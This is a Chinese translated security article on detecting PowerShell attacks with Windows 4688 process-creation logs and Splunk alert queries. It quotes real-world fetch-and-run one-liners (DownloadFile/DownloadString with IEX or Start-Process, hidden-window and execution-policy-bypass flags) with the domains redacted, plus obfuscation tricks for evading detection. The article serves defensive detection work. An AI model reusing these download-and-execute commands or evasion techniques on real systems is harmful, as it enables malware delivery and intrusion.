> 原文链接: https://www.anquanke.com//post/id/87272 


# 【技术分享】如何检测PowerShell攻击活动


                                阅读量   
                                **238888**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：securityaffairs.co
                                <br>原文地址：[http://securityaffairs.co/wordpress/65570/hacking/powershell-attacks.html](http://securityaffairs.co/wordpress/65570/hacking/powershell-attacks.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p5.ssl.qhimg.com/t01cc2e63a1cb2479b6.png)](https://p5.ssl.qhimg.com/t01cc2e63a1cb2479b6.png)**



译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、前言**



最近一阶段，我一直在分析研究客户网络环境中的PowerShell攻击活动。根据分析及研究成果，我梳理出了一些特征，利用这些特征，我们可以使用Windows事件日志来检测环境中潜在的PowerShell攻击活动。在本文中，首先我们来梳理一下PowerShell在实际攻击活动中的使用场景，其次，我们再研究一下相应的检测机制。

<br>

**二、PowerShell在攻击活动中的应用**



众所周知，PowerShell非常强大，我们已经看到越来越多的攻击者选择PowerShell作为攻击手段。PowerShell是微软Windows操作系统中自带的软件包，因此，攻击者可以在受害者主机中随时使用这款工具。

“（在攻击活动中）Powershell主要承担了下载器（downloader）角色”。

在实际观察到的攻击活动中，PowerShell的主要作用是从远程位置下载恶意文件到受害者主机中，然后使用诸如**Start-Porcess**、**Invoke-Item**或者**Invoke-Expression**（**-IEX**）之类的命令执行恶意文件，PowerShell也可以将远程文件直接下载到受害者主机内存中，然后从内存中执行。

实际攻击活动中经常使用到**System.net.Webclient**中的两种方法：

```
(New-object System.net.webclient).DownlodFile() 
(New-object System.net.Webclient).DownloadString()
```

**2.1 (New-object System.net.webclient).DownlodFile()**

该方法最简单的一种使用场景如下图所示（我们可以使用类似Xampp之类的平台搭建http(s)服务器环境，来测试这种方法的功能）。

[![](https://p1.ssl.qhimg.com/t01a0b609e559205cde.png)](https://p1.ssl.qhimg.com/t01a0b609e559205cde.png)

如上图所示，利用这种方法，攻击者可以将目标文件（`evilfile.txt`）下载到`$Appdata`环境变量所对应的`C:Userskirtar_ozaAppDataRoaming`路径中，然后使用“**Invoke-Item**”命令执行这个文件。

在实际攻击活动中，我们曾见过如下用法：

```
C:WindowsSystem32WindowsPowerShellv1.0powershell.exe" -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://**********.com/***/**.dat', $env:APPDATA + '***.exe'); Start-Process $env:APPDATA'***.exe
```

如上述代码所示，攻击者使用`.downloadfile()`方法下载远程文件，利用环境变量，将该文件存放到用户的appdata目录，然后使用“**Start-Process**”来执行下载的二进制文件。

我们还在实际攻击活动中见过如下案例，攻击者使用PowerShell下载并执行远程文件：



```
C:WINDOWSSysWOW64WindowsPowerShellv1.0powershell.exe" iex $env:vlbjkf
C:WINDOWSSysWOW64WindowsPowerShellv1.0powershell.exe" Invoke-Expression $env:imumnj
C:WindowsSystem32cmd.exe" /c PowerShell "'PowerShell ""function Bdabgf([String] $hcre)`{`(New-Object System.Net.WebClient).DownloadFile($hcre,''C:Users***AppDataLocalTemp****.exe'');Start-Process   ''C:Users****AppDataLocalTemp****.exe'';`}`try`{`Bdabgf(''http://*****.com/****.png'')`}`catch`{`Bdabgf(''http://*****.de/***.png'')`}`'"" | Out-File -encoding ASCII -FilePath C:Users****AppDataLocalTemp*****.bat;Start-Process 'C:Users*****AppDataLocalTemp******.bat' -WindowStyle Hidden"
```

**2.2 (New-object System.net.Webclient).DownloadString()**

`DownloadString()`并不会将文件下载到磁盘中，相反，该方法会将远程文件的内容直接载入受害者主机的内存中。这些文件通常为恶意脚本，攻击者可以使用Powershell的`–Command`参数在内存中直接执行这些文件。无文件恶意软件中经常用到这种技术，以便在内存中直接执行恶意脚本，而无需将任何文件保存到磁盘中。攻击者经常使用这种技术来绕过基于特征的检测机制。

这种方法最简单的一种使用场景如下所示：[![](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)

[![](https://p5.ssl.qhimg.com/t019c6ac53c8a49cc51.png)](https://p5.ssl.qhimg.com/t019c6ac53c8a49cc51.png)

`cmd.js`是一个远程脚本，可以从受害者主机的内存中直接启动`calc.exe`进程，无需将任何文件保存到磁盘上（注意：只需利用记事本打开`calc.exe`并将其保存为`.js`文件即可）。

实际攻击活动中，我们曾见过如下用法：

```
powershell  -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('hxxp://******** [.]com/***/**.mdf', $env:APPDATA + '***.exe'); Start-Process $env:APPDATA'***.exe';(New-Object System.Net.WebClient).DownloadString('hxxp://nv******[.]com/s.php?id=po**')
```

如上所示，攻击者用到了前面提到的两种方法，他们使用downloadstring()从远程主机下载某些php代码。

**<br>**

**三、使用某些PowerShell“标志”来隐藏操作痕迹**



攻击者会使用PowerShell中提供的各种选项，尽可能隐藏自己的操作痕迹。以下标志经常在实际攻击活动中出现，我们可以利用这些标志来梳理出一份IOC（Indicators of Compromise，攻击指示器）清单：

1、**–WindowStyle hidden / -w hidden**：对用户隐藏PowerShell程序窗口，以隐藏操作痕迹。

2、**–Exec Bypass**：用来绕过或者忽略类似**Restricted**的执行限制策略，这些策略会阻止PowerShell脚本运行。

3、**–Command / -c**：从PowerShell终端中执行任意命令。

4、**–EncodedCommand / -e / -Enc**：在命令行中，将经过编码的参数传递给PowerShell加以执行。

5、**–Nop / -Noprofile**：忽略配置（Profile）文件中的命令。

你可以在前面列举的几个例子中查找这些标志，理解“**-nop -Exec Bypass –Command**”标志的用法。

实际环境中，攻击者会使用各种标志开展攻击活动，某些例子如下所示：



```
C:WINDOWSsystem32cmd.exe /c powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring('http://****.com/Updates')
PowersHell –e  &lt;encoded input&gt;
Powershell – Enc &lt;encoded input&gt;
```

**<br>**

**四、IoC**



接下来，我们来看看实际环境中，哪些攻击指示器（IoC）可以用来检测可疑的PowerShell活动。

**4.1 观察PowerShell进程的层级关系**

通常情况下，当我们从Windows开始菜单或者从磁盘中运行PowerShell时，PowerShell进程会作为`explorer.exe`的子进程来运行：你可以使用[Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)或者[Process Hacker](http://processhacker.sourceforge.net/downloads.php)工具来观察进程的父子层级关系。[![](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)

[![](https://p3.ssl.qhimg.com/t0165a7e561631e5d9c.png)](https://p3.ssl.qhimg.com/t0165a7e561631e5d9c.png)

如上图所示，`Explorer.exe`为`Powershell.exe`的父进程。

大多数情况下，在PowerShell攻击活动中，攻击者会通过命令行进程来运行PowerShell脚本或命令，此时，我们通常可以观察到PowerShell进程的父进程为`cmd.exe`，这在实际攻击活动中非常常见。[![](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)

[![](https://p1.ssl.qhimg.com/t01520611eec2caa1fe.png)](https://p1.ssl.qhimg.com/t01520611eec2caa1fe.png)

然而，在某些合法场景中，PowerShell进程的父进程也是`cmd.exe`，比如管理员有时候希望运行某些PowerShell脚本，然后他会通过命令提示符（`cmd.exe`）来启动PowerShell。

“因此，查看祖父进程也是非常重要的一件事情，你可以查看是哪个进程启动了`cmd.exe`，这个信息可以帮助你分析这种场景是否属于攻击活动的一部分。”

因此，如果祖父进程为`winword.exe`、`winword.exe`或者`wuapp.exe`，这种情况表明，某个脚本启动了`cmd.exe`，我们需要好好研究一下这是个什么脚本。

“在某些情况下，我们可以观察到PowerShell进程由`windword.exe`直接启动运行，这是可疑活动的明显标志，我们需要记录下这类活动并加以分析。”

我们经常可以在钓鱼攻击中看到这类行为，在这种场景中，用户会点击并打开嵌有宏（vbscript）的Word文档，该文档会启动PowerShell进程，从Web端下载恶意数据。

因此，如果出现以下几种情况，我们需要多加小心并记录下相应的蛛丝马迹：

1、PowerShell由`winword.exe`启动运行（其父进程为`winword.exe`）；

2、PowerShell由`cmd.exe`启动运行（其父进程为`cmd.exe`），并且`cmd.exe`的父进程为`winword.exe`（即PowerShell的祖父进程为`winword.exe`）：

3、PowerShell由`mshta.exe`、`wscript.exe`、`wuapp.exe`、`tasking.exe`中的某个进程启动运行（其父进程为mshta、wscript、cscript、wuapp、tasking等）。

举个例子，执行某个简单的脚本后，我们可以利用Power Monitor工具观察到进程创建顺序，如下所示。这个例子中，PowerShell由`Wscript.exe`启动运行，这表明`Wscript.exe`为PowerShell的父进程，而PowerShell则是`conshost.exe`的父进程，该进程最终启动了`calc.exe`。[![](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)

[![](https://p1.ssl.qhimg.com/t016ae2d8feacf38460.png)](https://p1.ssl.qhimg.com/t016ae2d8feacf38460.png)

该脚本如下所示，只需将两行代码拷贝到Notepad中，将其保存为`.js`文件并运行即可。



```
shell = new ActiveXObject('WScript.Shell');
shell .Run("powershell.exe  Invoke-Item c:\windows\system32\calc.exe");
```

前面提到的特征可以作为攻击指示器加以使用，这些特征涉及许多方面的内容，我们可以以此为起点，在实际环境中记录PowerShell执行痕迹，然后着重查找上述IOC，根据这些特征进一步分析任何可疑的攻击活动。

**4.2 命令行即王道**

许多情况下，我们可以监控传递给PowerShell进程的命令行参数，借此来检测许多PowerShell攻击活动。此外，这些信息可以为我们提供线索，了解下一步该收集哪些证据。比如，如果攻击活动中用到了**downlodFile()** 方法，那么我们可以知道恶意文件在磁盘中的具体存储路径，也能知道恶意文件来自于哪个恶意网站。根据这些线索，我们可以进一步评估攻击活动的操作过程以及影响范围。

**<br>**

**五、Windows安全日志在检测PowerShell攻击活动中的作用**



根据PowerShell的具体版本以及所用的操作系统，我们可以使用各种方法来记录PowerShell相关日志。

在本文中，我想谈一下如何借助Windows事件代码来识别前文中提到的IOC。只要启用相关日志，记录下事件ID，我们就有可能检测到基于PowerShell的攻击行为。

这里我想分析一下Windows安全日志中的 4688事件，这个事件对应的是进程创建操作。进程创建过程中会产生大量事件，但只要使用基本的过滤条件，我们就能梳理出需要关心的那些日志。默认情况下，进程创建审计功能处于禁用状态，因此，我们首先需要使用GPO来启动这一功能，你可以参考[此处链接](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)了解更多细节。

此外，在进程创建过程中，我们还需要记录下所涉及的命令行参数。从Windows 8.1及Windows Server 2012 R2起，Windows系统开始提供命令行审计功能。我们可以使用GPO，在“**Administrative TemplatesSystemAudit Process Creation**” 中启用“**Include command line in process creation events**”选项来启用该功能。更多细节请参考[此处链接](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)。

在Windows 7、Server 2008以及Server 2008 R2系统上，你可以通过系统更新来添加这一新功能。更多细节请参考这两处链接[[1]](https://technet.microsoft.com/library/security/3004375)[[2]](https://support.microsoft.com/en-in/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)。

4688事件可以给我们提供三个关键元素，在SIEM（安全信息和事件管理）中，我们可以根据这些元素生成警告信息，以检测此类攻击行为。

1、创建的是哪个进程。

2、进程创建过程中用到了哪些命令行参数（如果存在参数传递的话）。

3、哪个进程是父进程（Windows 10/Server 2016及新版的系统会在Creator_Porcess_Name字段中包含父进程的进程名，之前版本的系统会在Creator_Process_ID字段中包含父进程的进程ID）。

我会以Splunk为例，介绍如何在实际环境中生成警告信息，检测可疑的PowerShell活动。此外，我也会介绍警告信息中需要注意哪些事项。

首先，我们感兴趣的是如何捕捉PowerShell攻击行为，因此我们需要监控与`Powershell.exe`进程创建或生成有关的一些事件。典型的4688事件如下所示，这个事件中包含一个名为“New_Process_Name”的字段，我们可以通过该字段了解创建的是哪个进程。

[![](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)](https://p2.ssl.qhimg.com/t01a42eb0d8e6abd673.gif)

[![](https://p0.ssl.qhimg.com/t01b09923322dd27650.png)](https://p0.ssl.qhimg.com/t01b09923322dd27650.png)

因此，我们需要通过如下搜索语句来筛选这些事件：

```
index=win_sec EventCode=4688 New_Process_Name="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

接下来，我们需要分析Powershell进程初始化过程中传递了哪些命令行参数。

我们可以通过Process_Command_Line字段了解新创建的进程（如Powershell）用到了哪些命令行参数。我们可以根据攻击中常用参数（如-e、-Encod、-windowstyle、-Bypass 、-c 、-command等）来构建警告信息。

```
index=win_sec EventCode=4688 New_Process_Name="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe –c OR –Encode OR  -e,  OR – windowstyle
```

更好的方法是根据已知的可疑命令行参数来构建输入查找清单，然后在警告信息中匹配这个清单。

从Windows 10以及Windows Server 2016开始，微软在4688事件中添加了一个名为“Creator Process Name”的字段，这个字段包含父进程的进程名信息。利用这个字段，我们可以根据可疑父进程来创建警告信息。



```
index=win_sec EventCode=4688 
New_Process_Name="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Creator_Process_Name= C:Program FilesMicrosoft OfficeOffice15winword.exe
New_Process_Name="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Creator_Process_Name= C:windowssystem32mshta.exeNew_Process_Name="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Creator_Process_Name= C:windowssystem32cmd.exe
```

**<br>**

**六、注意事项**



“不幸的是，PowerShell命令或脚本混淆起来非常简单。”

攻击者可以使用各种方法来混淆PowerShell脚本。比如，攻击者可以在PowerShell中使用随机变量或者字符串拼接技术，轻松绕过基于命令行参数及输入查找清单（如前文所述）的静态匹配机制。如下几种混淆技术可以让我们的静态匹配机制形同虚设。

赛门铁克曾发表过关于PowerShell攻击方法的一份[白皮书](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf)（**THE INCREASED USE OF POWERSHELL IN ATTACKS**），其中包含了[Daniel Bohannon](https://www.youtube.com/watch?v=P1lkflnWb0I)在Derbycon 2016上提到的关于Powershell混淆技术的几个绝佳案例。几种混淆技术如下所示，那份白皮书中也讨论过其中几种样例。

1、混用小写及大写字母（因为命令对大小写并不敏感）。

典型用例：

```
(neW-oBjEct system.NeT.WeBclieNT). dOWNloadfiLe
```

2、拼接字符串，变量中也可以使用这种技术，用单引号或双引号来拼接都可以。

典型用例：

```
(New-Object Net.WebClient). DownloadString(“ht”+’tp://’+$url)
```

3、除了14种特殊场景以外，转义字符（`）可以放在某个字符前，并且不会改变程序执行结果。当通过`cmd.exe`启动PowerShell时，我们也可以使用转义字符（^）来达到类似效果。

典型用例：

```
(new-object net. webclient).”d`o`wnl`oa`dstr`in`g”($url)
```

4、某些变量可以使用其对应的数字表示法来替代。

典型用例：我们可以使用“-window 1”来替代“-window hidden”。

在实际环境中，监控PowerShell的执行情况是非常有必要的一件事情，如果涉及到的命令行经过混淆处理，那么这种情况与网络攻击活动挂钩的可能性就变得非常大。因此，我们必须启用4688事件的记录功能，在该事件上应用过滤器，梳理出与PowerShell进程创建有关的那些事件，监控PowerShell进程创建过程中传递的命令行参数。

下次如果碰到类似场景，请保持冷静，竖起耳朵，仔细检查。


